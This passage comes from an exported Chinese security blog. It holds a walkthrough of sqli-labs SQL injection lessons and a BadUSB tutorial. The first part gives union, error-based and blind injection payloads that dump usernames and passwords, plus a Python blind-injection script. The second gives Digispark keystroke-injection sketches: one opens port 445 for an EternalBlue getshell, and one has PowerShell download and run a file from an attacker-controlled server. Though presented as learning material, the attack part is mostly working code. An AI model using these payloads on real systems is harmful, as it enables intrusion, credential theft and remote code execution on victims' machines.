alt=\"8\"><br>但是这样我们只能得到一个表，下面要用到一个函数<code>group__concat</code>，下面演示一下效果<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; select group_concat(table_name) from information_schema.tables where table_schema = 'security';\n+-------------------------------+</span>\n<span class=\"hljs-section\">| group_concat(table_name)      |\n+-------------------------------+</span>\n<span class=\"hljs-section\">| emails,referers,uagents,users |\n+-------------------------------+</span>\n1 row in set (0.00 sec)</code></pre></p>\n<p><code>group_concat</code>的作用就是把多个查询结果并到一起，于是payload修改为<br><pre><code class=\"hljs undefined\">id=-1' union <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">group_concat</span>(table_name) <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema = <span class=\"hljs-string\">'security'</span> <span class=\"hljs-comment\">-- +</span></code></pre></p>\n<p><img src=\"/img/2018-07-20/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"><br>用户账号密码应该在users表里头了,我们要查的表就是<code>users</code>表了，简单修改一下payload，把<code>table_name</code>换成<code>column_name</code>，把<code>information_schema.tables</code>换成<code>information_schema.columns</code>，再把<code>table_schema</code>换成<code>table_name</code>，payload为<br><pre><code class=\"hljs undefined\">id=-1' union <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">group_concat</span>(column_name) <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name = <span class=\"hljs-string\">'users'</span> <span class=\"hljs-comment\">-- +</span></code></pre></p>\n<p><img src=\"/img/2018-07-20/10.png\" srcset=\"/img/static/loading.gif\" alt=\"10\"><br>列也知道了，我们就直接枚举username和password，payload为<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">id</span>=-1' union select 1,group_concat(username),group_concat(password) <span class=\"hljs-keyword\">from</span><span class=\"hljs-built_in\"> users </span>-- +</code></pre></p>\n<p><img src=\"/img/2018-07-20/11.png\" srcset=\"/img/static/loading.gif\" alt=\"11\"><br>第一关就算是过了</p>\n<h5 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less-2\"></a>less-2</h5><p>第二关和第一关如出一辙，只不过id后面的内容没有引号引起来，php代码对比如下<br><pre><code class=\"hljs undefined\">SELECT * <span class=\"hljs-keyword\">FROM</span><span class=\"hljs-built_in\"> users </span>WHERE <span class=\"hljs-attribute\">id</span>=<span class=\"hljs-string\">'$id'</span> LIMIT 0,1\n<span class=\"hljs-comment\">#第一关</span>\nSELECT * <span class=\"hljs-keyword\">FROM</span><span class=\"hljs-built_in\"> users </span>WHERE <span class=\"hljs-attribute\">id</span>=<span class=\"hljs-variable\">$id</span> LIMIT 0,1\n第二关</code></pre></p>\n<p>所以我们把paylaod的<code>id-1</code>后面的单引号去掉就好了甚至注释符都不用<br>payload如下<br><pre><code class=\"hljs undefined\">id=-1 union <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">database</span>()\n<span class=\"hljs-keyword\">id</span>=<span class=\"hljs-number\">-1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">group_concat</span>(table_name) <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema = <span class=\"hljs-string\">'security'</span>\n<span class=\"hljs-keyword\">id</span>=<span class=\"hljs-number\">-1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">group_concat</span>(column_name) <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name = <span class=\"hljs-string\">'users'</span>\n<span class=\"hljs-keyword\">id</span>=<span class=\"hljs-number\">-1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-keyword\">group_concat</span>(username),<span class=\"hljs-keyword\">group_concat</span>(<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">from</span> <span class=\"hljs-keyword\">users</span></code></pre></p>\n<p>第二关完</p>\n<h5 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less-3\"></a>less-3</h5><p>第三关<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">SELECT</span> * <span class=\"hljs-keyword\">FROM</span> <span class=\"hljs-keyword\">users</span> <span class=\"hljs-keyword\">WHERE</span> <span class=\"hljs-keyword\">id</span>=(<span class=\"hljs-string\">'$id'</span>) <span class=\"hljs-keyword\">LIMIT</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span></code></pre></p>\n<p>多了括号，直接上payload吧<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">-1</span>') union select <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,database() -- +</code></pre></p>\n<p>就不多列了</p>\n<h5 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less-4\"></a>less-4</h5><p>第四关<br>这次有点不同，当我们测试<code>id=1&#39;</code>时返回页面是正常的，测试<code>id=1&quot;</code>报错<br><img src=\"/img/2018-07-20/12.png\" srcset=\"/img/static/loading.gif\" alt=\"12\"><br>根据报错信息来看，查询语句大概如下<br><pre><code class=\"hljs undefined\">SELECT * <span class=\"hljs-keyword\">FROM</span><span class=\"hljs-built_in\"> users </span>WHERE id=(<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$id</span>\"</span>) LIMIT 0,1</code></pre></p>\n<p>看一眼index.php，差不多<br><img src=\"/img/2018-07-20/13.png\" srcset=\"/img/static/loading.gif\" alt=\"13\"><br>还是那个payload，换汤不换药<br><pre><code class=\"hljs undefined\">id=-1\") union <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">database</span>() <span class=\"hljs-comment\">-- +</span></code></pre></p>\n<h5 id=\"less-5\"><a href=\"#less-5\" class=\"headerlink\" title=\"less-5\"></a>less-5</h5><p>第五关开始提高难度<br>首先从大纲里看到第五关是双注入（double injection）,单引号（single quote）<br><img src=\"/img/2018-07-20/14.png\" srcset=\"/img/static/loading.gif\" alt=\"14\"><br>这个注入我也好久才理解，就不做了，直接分析<br><img src=\"/img/2018-07-20/15.png\" srcset=\"/img/static/loading.gif\" alt=\"15\"><br>首先，sql查询正确会返回<code>You are in...........</code>，错误会返回sql的错误，也就是说我们输入正确的查询语句不会返回结果，所以我们要提交错误的查询语句，或者说会报错的语句比较合适，先介绍一些函数<code>count()</code>，<code>rand()</code>,<code>floor()</code>,<code>concat_ws</code><br><pre><code class=\"hljs undefined\"><span class=\"hljs-function\"><span class=\"hljs-title\">count</span><span class=\"hljs-params\">()</span></span>         计算总数\n<span class=\"hljs-function\"><span class=\"hljs-title\">rand</span><span class=\"hljs-params\">()</span></span>    \t \t生成<span class=\"hljs-number\">0</span>~<span class=\"hljs-number\">1</span>的随机数\n<span class=\"hljs-function\"><span class=\"hljs-title\">floor</span><span class=\"hljs-params\">()</span></span>    \t\t向下取整\n<span class=\"hljs-function\"><span class=\"hljs-title\">concat_ws</span><span class=\"hljs-params\">()</span></span> \t拼接查询结果</code></pre></p>\n<p>最后一个可能不好理解，用例子说明下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; select concat_ws(':',username,password) from users;\n+----------------------------------+</span>\n<span class=\"hljs-section\">| concat_ws(':',username,password) |\n+----------------------------------+</span>\n| Dumb:Dumb                        |\n| admin:admin                      |\n| admin1:admin1                    |\n| admin2:admin2                    |\n| admin3:admin3                    |\n| dhakkan:dumbo                    |\n<span class=\"hljs-section\">| admin4:admin4                    |\n+----------------------------------+</span>\n7 rows in set (0.00 sec)</code></pre></p>\n<p>1<br>rand()<em>2生成0~2的随机数，floor(rand()</em>2)产生0或1<br>2<br>以<code>select database()</code>为例子<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()\n<span class=\"hljs-keyword\">concat_ws</span>(<span class=\"hljs-string\">':'</span>,<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-keyword\">floor</span>(<span class=\"hljs-keyword\">rand</span>()*<span class=\"hljs-number\">2</span>))\n<span class=\"hljs-keyword\">select</span> conut(*),<span class=\"hljs-keyword\">concat_ws</span>(<span class=\"hljs-string\">':'</span>,(<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()),<span class=\"hljs-keyword\">floor</span>(<span class=\"hljs-keyword\">rand</span>()*<span class=\"hljs-number\">2</span>)) <span class=\"hljs-keyword\">as</span> a <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> a</code></pre></p>\n<p><img src=\"/img/2018-07-20/16.png\" srcset=\"/img/static/loading.gif\" alt=\"16\"><br>数据库名<code>security</code>已经出来了<br>关于原因<br><b><code>concat_ws(&#39;:&#39;,select database(),floor(rand()*2))</code>会产生一大堆<code>security:0</code>，<code>security:1</code>的查询结果，重点在<code>group by</code>，在排序时，排序的结果在临时表里，在插入前会先计算一遍要插入结果的内容，假如是<code>security:0</code>，如果此时临时表只有<code>security:1</code>的行不存在<code>security:0</code>的行，那么数据库要将该条记录插入临时表，由于后面的0和1是随机数，在插入时又要计算一次，那么此时的结果可能已经不再是<code>security:0</code>而变成了<code>security:1</code>了，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</b><br>后面的基本差不多，就不列了，有人可能把这道题当做盲注来做<del>一开始我也是这么想的</del></p>\n<h5 id=\"less-6\"><a href=\"#less-6\" class=\"headerlink\" title=\"less-6\"></a>less-6</h5><p><b>双引号的双注入</b>&gt;，把less-5的单引号变成双引号，换汤不换药</p>\n<h5 id=\"less-7\"><a href=\"#less-7\" class=\"headerlink\" title=\"less-7\"></a>less-7</h5><p><b>导入文件注入</b>，这个需要知道网站在系统中的具体位置，（网站管理员怎么可能给你知道。。）也比较难，网上也有写的狠详细的过程–&gt;<a href=\"https://www.cnblogs.com/lcamry/p/5763105.html\" target=\"_blank\" rel=\"noopener\">传送门</a>,就直接下一关吧</p>\n<h5 id=\"less-8\"><a href=\"#less-8\" class=\"headerlink\" title=\"less-8\"></a>less-8</h5><p>Blind Boolian Based（布尔盲注），这里又涉及到一个盲注的概念，上面的可以直接返回结果是直接注入拿到数据库表单及列等数据，盲注就是，查询结果正确页面返回正常，查询错误页面返回错误，不会带出数据<br>举很简单的例子,<code>1=1</code>正确<br><img src=\"/img/2018-07-20/17.png\" srcset=\"/img/static/loading.gif\" alt=\"17\"><br><code>1=2</code>错误<br><img src=\"/img/2018-07-20/18.png\" srcset=\"/img/static/loading.gif\" alt=\"18\"><br>然后注入方法就是不断的查询，通常盲注都要写脚本，先介绍一些函数，<code>ascii()</code>,这个函数式把字母变成ascii码值，<code>substr()</code>这个函数式切割字符串，假设<code>a=test</code>,<code>substr(a,1,1)=t</code>,<code>substr(a,2,1)=e</code>,以此类推，查数据库payload<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>' and ascii(substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)) &gt;= '<span class=\"hljs-number\">97</span></code></pre></p>\n<p><code>substr</code>取<code>database()</code>的第一个字符，ascii把它变化才能ascii码值，然后做对比，比较它的ascii码值是否大于等于97，即’a’<br><img src=\"/img/2018-07-20/19.png\" srcset=\"/img/static/loading.gif\" alt=\"19\"><br>返回正确，然后一直判断下去，遍历所有字母，一个个去试肯定比较麻烦，所以首选写脚本，其次也不能一个个遍历，可以用二分法，可以节省很多时间，python自动跑数据库名脚本如下<br><pre><code class=\"hljs python\">import requests\ntxt1 = \"http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),\"\ntxt2 = \",1)) &gt;= '\"\ntxt3 = \",1)) = '\"\npayload1 = 1 \npayload2 = 97\ntxt4 = 'You are in..........'\nnum11 = 97\nnum12 = 65\nnum13 = 48\ncode = ''\nnum1 = 0\nnum2 = 0\nnum3 = 0\nfor i in range(1,9)://长度\n\turl = txt1+str(i)+txt2+str(num11)\n\treq = requests.get(url = url)\n\treqtext = req.text[570:590]\n\t//reqtext是获取页面上的内容是不是等于txt4\n\tif(reqtext == txt4):\n\t\tnum1 = 1\n\n\turl = txt1+str(i)+txt2+str(num12)\n\treq = requests.get(url = url)\n\treqtext = req.text[570:590]\n\tif(reqtext == txt4):\n\t\tnum2 = 1\n\n\turl = txt1+str(i)+txt2+str(num13)\n\treq = requests.get(url = url)\n\treqtext = req.text[570:590]\n\tif(reqtext == txt4):\n\t\tnum3 = 1\n//判断范围，数字48-57，大写65-90，小写97-122\n//字母切三次，判断三次，部分四次，abc def ghi jklm nop qrs tuv wxyz\n//数字切一次，判断五次，01234 56789\n\n\tif(num1 == 1):\n\t\tnum = 97\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext != txt4):\n\t\t\tnum -= 3\n\t\tif(reqtext == txt4) and ((num == 106) or (num == 119)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num1 == 0 and num2 == 1):\n\t\tnum = 65\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext != txt4):\n\t\t\tnum -= 3\n\t\tif(reqtext == txt4) and ((num == 74) or (num == 87)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num2 == 0 and num3 == 1):\n\t\tnum =48\n\t\tnum += 5\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tnum -= 5\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0</code></pre></p>\n<p>结果如下<br><img src=\"/img/2018-07-20/20.png\" srcset=\"/img/static/loading.gif\" alt=\"20\"><br>查表查列修改代码url部分即可,给出前面部分，长度需要自己调整，手工判断下就可以了，没有必要写脚本<br><pre><code class=\"hljs undefined\">import requests\ntxt1 = <span class=\"hljs-string\">\"http://localhost/sqli-labs/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 2,1),\"</span>\ntxt2 = <span class=\"hljs-string\">\",1))) &gt;= '\"</span>\ntxt3 = <span class=\"hljs-string\">\",1))) = '\"</span></code></pre></p>\n<p>妈呀写博客比学的还累。。。</p>"},{"title":"badusb的学习记录&入侵windows主机","index_img":"/img/2018-06-12/badusb.png","date":"2018-06-11T16:35:47.000Z","_content":"\n### 写在前面\n&emsp;&emsp;对于人们熟悉的网络安全，一旦发现漏洞可以很快的应对和修补，然而对于硬件安全，漏洞的危害即使不是很大也要耗费很大的人力物力才可以把有问题的设施更换掉，对于一些比更大的漏洞就更加难并且花费巨大\n<!--more-->\n\n#### 知识准备\n![badusb](/img/2018-06-12/badusb.png)\n&emsp;&emsp;灯灯灯凳，这个就是我们的主角啦\n&emsp;&emsp;对于第一次玩硬件的小伙伴，硬件入门不难，但是要有耐心，很多时候是需要不断的去调试代码，查找资料，所以一定要有耐心。\n##### 一、U盘的结构\n&emsp;&emsp;要想理解badusb攻击的方法就要先了解U盘的结构，U盘的主要结构如下\n```\n|--------|---------------|\n|  固件  |   数据存储区   |\n|--------|---------------|\n```\n &emsp;&emsp;U盘由芯片控制器和闪存两部分组成（也间接说明为什么U盘的额空间总是不够写的那么大），芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。\n##### usb协议\n&emsp;&emsp;现在很多设备都是用usb接口，摄像头、U盘、鼠标、键盘，无线键鼠的接收器，等等，为了兼容这么多设备，设计USB协议标准的时候就没有要求每个USB设备向网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备多个输入输出设备的特征。\n&emsp;&emsp;问题就是在这里，当你插进一个U盘时电脑并没有鉴别你的U盘到是不是真的U盘，这样我们就有机可乘了\n![xixixi](/img/2018-06-12/xixixi.png)\n##### 入侵原理\n正常的U盘插到电脑里的大概流程是下面这样的\n```\n           电脑识别为U盘的固件\n固件信息-------------------------->U盘----->读取U盘的内容----->示U盘的内容\n```\n构造badusb的固件让电脑识别为键盘\n```\n           电脑识别为键盘的固件\n固件信息-------------------------->键盘\n```\n再构造里面的内容\n```\n键盘----->模拟人敲命令----->根据写好的脚本敲命令\n```\n##### 材料准备\n&emsp;&emsp;材料清单\n- Digispark（也就是我们的主角）\n- Arduino（编写以及把脚本写到badusb里的程序）\n- 脚本\n\n#### 开干\n##### 安装驱动\n驱动下载地址，链接：[http://pan.baidu.com/s/1i4K10dn](http://pan.baidu.com/s/1i4K10dn) 密码：ilaf\n```\n下载好后运行`DPinst64.exe`，32位系统点击`DPinst.exe`,一路回车等待安装完成\n下载编写程序的开发软件[https://www.arduino.cc/en/Main/Software](https://www.arduino.cc/en/Main/Software)\n运行Arduino，在首选项中添加开发板网址[http://digistump.com/package_digistump_index.json](http://digistump.com/package_digistump_index.json)(不同的板网址不同)\n```\n![1](/img/2018-06-12/1.png)\n在工具-->开发板-->开发板管理器里，下载这个驱动,等待下载完成即可\n![2](/img/2018-06-12/2.png)\n```\n选择Digispark开发板\n编译器选择USBtinyISP\n```\n![3](/img/2018-06-12/3.png)\n![4](/img/2018-06-12/4.png)\n到这里所有准备就做好了\n![xixixi](/img/2018-06-12/xixixi.png)\n##### 写脚本\n先看一眼商家给的教程\n![jiaocheng](/img/2018-06-12/jiaocheng.png)\n![emmm...](/img/2018-06-12/emmm.jpg)\n在我的印象中应该是写一个木马进固件然后一插进电脑就黑进去的啊[捂脸][捂脸][捂脸]\n算了，先一步一步跟着教程摸索下\n最终代码如下，修改了一点点\n```\n#include \"DigiKeyboard.h\"\n#define KEY_ESC     41\n#define KEY_BACKSPACE 42\n#define KEY_TAB     43\n#define KEY_PRT_SCR 70\n#define KEY_DELETE  76\n\nvoid setup() {\n\nDigiKeyboard.delay(5000);\nDigiKeyboard.sendKeyStroke(0);\nDigiKeyboard.delay(5000);\nDigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(F(\"cmd\"));\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(F(\"echo\"));\nDigiKeyboard.sendKeyStroke(0,MOD_SHIFT_LEFT);\nDigiKeyboard.print(F(\" \"));\nDigiKeyboard.print(F(\"Team233\"));\nDigiKeyboard.sendKeyStroke(0,MOD_SHIFT_LEFT);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\n\n}\n\n\nvoid loop() {\n\n}\n```\n编译...没问题,上传...O98k\n![7](/img/2018-06-12/7.png)\n激动人心的时候到了，重新插进电脑去,10秒后...\n![final](/img/2018-06-12/final.png)\n![6](/img/2018-06-12/6.png)\n到目前为止就算badusb就算做好了\n#### 进阶教程\n上面只是简单的尝试，接下来要进行更高级的用法\n![gif](/img/2018-06-12/1.gif)\n然鹅。。。。。\n![8](/img/2018-06-12/8.png)\n![9](/img/2018-06-12/9.jpg)\n只有这么点容量怎么写马，而且商家没说，网上也找不到，怎么写。。。。。\n忽然想起当时买这个的时候有好多个版本。。。\n我绝对不会告诉你我是因为它<b>~~比较便宜~~</b>体积小迷你好看才买它的\n经过我一番沉思与实践之后\n如果目标是win7系统，我们可以利用终端打开445端口，然后使用永恒之蓝漏洞直接getshell\n如果目标是win10，我们可以从我们搭好的服务器下载木马饭后执行木马程序，对win7也同样适用\ncmd开启445端口命令如下\n```\nnetsh advfirewall firewall add rule name=\"open 445\" dir=in action=allow protocol=TCP localport=445\n```\n编写好的脚本代码如下\n```\n#include \"DigiKeyboard.h\"\n#define KEY_ESC     41\n#define KEY_BACKSPACE 42\n#define KEY_TAB     43\n#define KEY_PRT_SCR 70\n#define KEY_DELETE  76\n\nvoid setup() {\nDigiKeyboard.delay(5000);\nDigiKeyboard.sendKeyStroke(0);\nDigiKeyboard.delay(5000);\nDigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(F(\"cmd\"));\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(F(\"netsh advfirewall firewall add rule name=\")); \nDigiKeyboard.print(char(34)); \nDigiKeyboard.print(F(\"open445\")); \nDigiKeyboard.print(char(34)); \nDigiKeyboard.print(F(\" dir=in protocol=tcp localport=445 action=allow\"));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\n}\n\n\nvoid loop() {\n\n}\n```\n在kali下nmap可以看到445端口已经打开,msf直接漏洞利用就可以实现getshell\n![445](/img/2018-06-12/445.png)\nwin10系统下载测试文件Team233.png的脚本代码如下\n```\n#include \"DigiKeyboard.h\"\n#define KEY_ESC     41\n#define KEY_BACKSPACE 42\n#define KEY_TAB     43\n#define KEY_PRT_SCR 70\n#define KEY_DELETE  76\n\nvoid setup() {\nDigiKeyboard.delay(5000);\nDigiKeyboard.sendKeyStroke(0);\nDigiKeyboard.delay(5000);\nDigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(F(\"pow\"));\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(0,MOD_SHIFT_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(F(\"$client = new-object System.Net.WebClient\"));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.print(F(\" $client.DownloadFile('http://192.168.1.2/Team233.png', '.\")); \nDigiKeyboard.print(char(92)); \nDigiKeyboard.print(F(\"Team233.png')\"));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.print(F(\".\"));\nDigiKeyboard.print(char(92)); \nDigiKeyboard.print(F(\"Team233.png\"));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\n}\n\n\nvoid loop() {\n\n}\n```\n效果就参考我录的视频吧\n链接: [https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ](https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ) 密码: c9he\n<b>未经允许不得传播</b>\n<b>本文仅供学习之用，不负任何法律责任<b>","source":"_posts/2018-06-12-badusb.md","raw":"---\ntitle: badusb的学习记录&入侵windows主机\nindex_img: /img/2018-06-12/badusb.png\ndate: 2018-06-12 00:35:47\ntags: \n- 硬件安全\n- badusb\n---\n\n### 写在前面\n&emsp;&emsp;对于人们熟悉的网络安全，一旦发现漏洞可以很快的应对和修补，然而对于硬件安全，漏洞的危害即使不是很大也要耗费很大的人力物力才可以把有问题的设施更换掉，对于一些比更大的漏洞就更加难并且花费巨大\n<!--more-->\n\n#### 知识准备\n![badusb](/img/2018-06-12/badusb.png)\n&emsp;&emsp;灯灯灯凳，这个就是我们的主角啦\n&emsp;&emsp;对于第一次玩硬件的小伙伴，硬件入门不难，但是要有耐心，很多时候是需要不断的去调试代码，查找资料，所以一定要有耐心。\n##### 一、U盘的结构\n&emsp;&emsp;要想理解badusb攻击的方法就要先了解U盘的结构，U盘的主要结构如下\n```\n|--------|---------------|\n|  固件  |   数据存储区   |\n|--------|---------------|\n```\n &emsp;&emsp;U盘由芯片控制器和闪存两部分组成（也间接说明为什么U盘的额空间总是不够写的那么大），芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。\n##### usb协议\n&emsp;&emsp;现在很多设备都是用usb接口，摄像头、U盘、鼠标、键盘，无线键鼠的接收器，等等，为了兼容这么多设备，设计USB协议标准的时候就没有要求每个USB设备向网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备多个输入输出设备的特征。\n&emsp;&emsp;问题就是在这里，当你插进一个U盘时电脑并没有鉴别你的U盘到是不是真的U盘，这样我们就有机可乘了\n![xixixi](/img/2018-06-12/xixixi.png)\n##### 入侵原理\n正常的U盘插到电脑里的大概流程是下面这样的\n```\n           电脑识别为U盘的固件\n固件信息-------------------------->U盘----->读取U盘的内容----->示U盘的内容\n```\n构造badusb的固件让电脑识别为键盘\n```\n           电脑识别为键盘的固件\n固件信息-------------------------->键盘\n```\n再构造里面的内容\n```\n键盘----->模拟人敲命令----->根据写好的脚本敲命令\n```\n##### 材料准备\n&emsp;&emsp;材料清单\n- Digispark（也就是我们的主角）\n- Arduino（编写以及把脚本写到badusb里的程序）\n- 脚本\n\n#### 开干\n##### 安装驱动\n驱动下载地址，链接：[http://pan.baidu.com/s/1i4K10dn](http://pan.baidu.com/s/1i4K10dn) 